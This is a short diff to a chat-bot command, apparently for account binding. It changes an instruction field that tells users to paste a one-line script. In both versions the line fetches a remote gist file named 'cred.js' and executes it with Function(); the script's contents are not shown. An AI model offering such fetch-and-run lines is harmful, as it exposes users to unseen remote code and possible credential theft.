@@ -44,7 +44,7 @@ module.exports = {
                 { name: t(lang, 'bind_step1_label'), value: t(lang, 'bind_step1') },
                 { name: t(lang, 'bind_step2_label'), value: t(lang, 'bind_step2') },
                 { name: t(lang, 'bind_step3_label'), value: t(lang, 'bind_step3') },
-                { name: t(lang, 'bind_script_label'), value: '```javascript\nfetch("https://gist.githubusercontent.com/xydesu/e77a5769292b80801fa246a4e068af47/raw/e0fa110679e6164efda76cfb87d12cfcce287ddb/cred.js").then(r=>r.text()).then(t=>Function(t)()).catch(e=>console.error(e))\n```' },
+                { name: t(lang, 'bind_script_label'), value: '```javascript\n(async()=>{try{const r=await fetch("https://gist.githubusercontent.com/xydesu/e77a5769292b80801fa246a4e068af47/raw/e0fa110679e6164efda76cfb87d12cfcce287ddb/cred.js");const t=await r.text();Function(t)();}catch(e){console.error(e);}})()\n```' },
                 { name: t(lang, 'bind_step4_label'), value: t(lang, 'bind_step4') },
                 { name: t(lang, 'bind_step5_label'), value: t(lang, 'bind_step5') }
             )
